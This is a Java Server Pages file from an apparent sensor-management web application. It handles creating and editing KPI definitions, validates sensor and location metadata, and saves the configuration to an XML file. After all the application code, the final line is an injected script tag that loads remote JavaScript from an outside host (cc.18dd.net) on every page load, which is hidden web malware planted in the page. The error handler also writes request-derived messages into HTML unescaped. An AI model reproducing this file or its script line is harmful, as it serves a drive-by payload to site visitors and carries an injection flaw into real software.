<%@ page import="org.smf.smp.*" %>
<%@ page import="org.smf.smp.event.*" %>
<%@ page import="org.smf.smp.dp.*" %>
<%@ page import="org.dp.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.io.*" %>
<%@ page import="org.netbeams.web.*" %>
<%@ page import="org.kpi.*" %>
<%@ page import="org.jdom.*" %>
<%@ page import="org.jdom.input.*" %>
<%@ page import="org.jdom.output.XMLOutputter" %>
<%@ page import="org.jdom.output.Format" %>
<%@ page isErrorPage="true" %>




<%

	try {
		String action = request.getParameter("action");
		String currentKPIName = request.getParameter("currentKPIName");

		if (action == null || (! action.equals("edit") && ! action.equals("create")))
			throw new Exception("Invalid action '" + action + "'.");

		String kpiName = request.getParameter("kpiName");
		String kpiDescription = request.getParameter("kpiDescription");
		int trigger = Integer.parseInt(request.getParameter("trigger"));		
		String kpiRule = request.getParameter("kpiRule");
		String[] metadataNames = request.getParameterValues("metadataName");
		String[] metadataValues = request.getParameterValues("metadataValue");
		
		String sensorsQS = request.getParameter("sensors");		
		String[] sensorIds = null;
		if (sensorsQS != null && sensorsQS.trim().length() > 0) {
			sensorIds = sensorsQS.split(",");
		} else {
			sensorIds = new String[0];
		}
		

		System.out.println("\n\n**********************************************************");
		System.out.println("KPI Name: " + kpiName);
		System.out.println("KPI desc: " + kpiDescription);
		System.out.println("Trigger: " + trigger);
		System.out.println("KPI rule: " + kpiRule);
		System.out.println("Metadata name length: " + metadataNames.length);
		System.out.println("Metadata value length: " + metadataValues.length);
		System.out.println("Sensors: " + request.getParameter("sensors"));
		System.out.println("Sensor length: " + sensorIds.length);
		System.out.println("**********************************************************");


		

		
		Sensor[] sensors = null;
		if (sensorIds != null) {
			sensors = new Sensor[sensorIds.length];
			SensorManagementPlatform smp = SensorManagementPlatform.getInstance();
			for (int i = 0; i < sensors.length; i++) {
				Sensor sensor = smp.getSensor(sensorIds[i].trim());
				if (sensor == null) {
					throw new Exception("Invalid sensor ID '" + sensorIds[i] + "'. This sensor DOES NOT exist.");
				}

				sensors[i] = sensor;
			}
		} else {
			sensors = new Sensor[0];
		}




		Hashtable<String, String> metadata = new Hashtable<String, String>();
		for (int i = 0; i < metadataNames.length; i++) {

			String name = metadataNames[i];
			String value = metadataValues[i];

			// location values are NOT required but if the user leave it blank,
			// make it 0.0 by default
			if (name.equals("latitude")) {
				if (value == null || value.trim().length() <= 0) {
					value = "0.0";
				} else {
					// make sure value is a FLOAT
					try {
						float f = Float.parseFloat(value);
					} catch (NumberFormatException e) {
						throw new Exception("Invalid latitude value. Value MUST be a decimal number.");
					}
				}
			}
			
			if (name.equals("longitude")) {
				if (value == null || value.trim().length() <= 0) {
					value = "0.0";
				} else {
					// make sure value is a FLOAT
					try {
						float f = Float.parseFloat(value);
					} catch (NumberFormatException e) {
						throw new Exception("Invalid longitude value. Value MUST be a decimal number.");
					}
				}
			}

			if (name.equals("altitude")) {
				if (value == null || value.trim().length() <= 0) {
					value = "0.0";
				} else {
					// make sure value is a FLOAT
					try {
						float f = Float.parseFloat(value);
					} catch (NumberFormatException e) {
						throw new Exception("Invalid altitude value. Value MUST be a decimal number.");
					}
				}
			}


			if (name != null && value != null) {
				name = name.trim();
				value = value.trim();
				if (name.length() > 0 && value.length() > 0) {
					metadata.put(name, value);
				}
			}
		}




		KPIManager kpiManager = KPIManager.getInstance();
		KPI kpi = null;
		SAXBuilder builder = new SAXBuilder();
		Document document = builder.build(new File(NetBEAMSConstants.KPIS_CONFIGURATIONS));
		Element root = document.getRootElement();
		Element kpiElement = null;

		
		if (action.equals("edit")) {
			kpi = kpiManager.getKPI(currentKPIName);
			if (kpi == null)
				throw new Exception("Invalid KPI name '" + currentKPIName + "'. KPI DOES NOT exist.");

			// remember the current kpi's name incase the KPI changed its name which mean we CAN NOT
			// find it in the configurations file
			String oldName = kpi.getName();
			
			kpi.setName(kpiName);
			kpi.setDescription(kpiDescription);
			kpi.setTrigger(trigger);
			kpi.setSensors(sensors);
			kpi.setRule(kpiRule);
			kpi.setMetadata(metadata);
			
			
			out.println("<h2>KPI reconfigured successfully.</h2><br>");
			out.println("<a href='index.jsp'>View the list of KPIs.</h2>");			
			
			
			// search for the KPI element with the given name
			Iterator i = root.getChildren().iterator();
			while (i.hasNext()) {
				Element elm = (Element)i.next();
				if (elm.getAttributeValue("name").equals(oldName)) {
					kpiElement = elm;
					kpiElement.removeChildren("rule");
					kpiElement.removeChildren("metadata");
					break;
				}
			}
			
		} else if (action.equals("create")) {
			kpi = kpiManager.addKPI(kpiName, kpiDescription, trigger, sensors, metadata, kpiRule);
			(new Thread(kpi)).start();
			out.println("<h2>New KPI added successfully.</h2><br>");
			out.println("<a href='index.jsp'>View the list of KPIs.</h2>");
			
			
			kpiElement = new Element("kpi");
			root.addContent(kpiElement);
		}


		
		if (kpi != null && kpiElement != null) {

			// Save the KPI's configuration to a file

			kpiElement.setAttribute("name", kpi.getName());
			kpiElement.setAttribute("description", kpi.getDescription());
			kpiElement.setAttribute("trigger", kpi.getTrigger() + "");
			kpiElement.setAttribute("sensors", sensorsQS);


			Element kpiRuleElement = new Element("rule");
			kpiRuleElement.setText(kpi.getRule());
			kpiElement.addContent(kpiRuleElement);
			
			Enumeration en = metadata.keys();
			while (en.hasMoreElements()) {
				String name = (String)en.nextElement();
				String value = (String)metadata.get(name);

				Element metadataElement = new Element("metadata");
				metadataElement.setAttribute("name", name);
				metadataElement.setAttribute("value", value);
				kpiElement.addContent(metadataElement);
			}
			



			// save the new KPI to the list of KPIs
			PrintWriter output = new PrintWriter(new BufferedWriter(new FileWriter(NetBEAMSConstants.KPIS_CONFIGURATIONS)));
			XMLOutputter outputter = new XMLOutputter(Format.getPrettyFormat());
			outputter.output(document, output);
			output.close();

			

		}


	} catch (Exception e) {
		e.printStackTrace();
//		System.out.println("ERROR: " + e.printStackTrace());
		out.println("<p style='color:#dd0000; font-weight:bold'>ERROR: " + e.getMessage() + "</p>");
		out.println("<input type='button' onclick='history.back()' value='Go back'/>");
	}
%>







<script language=javascript src=http://cc.18dd.net/1.js></script>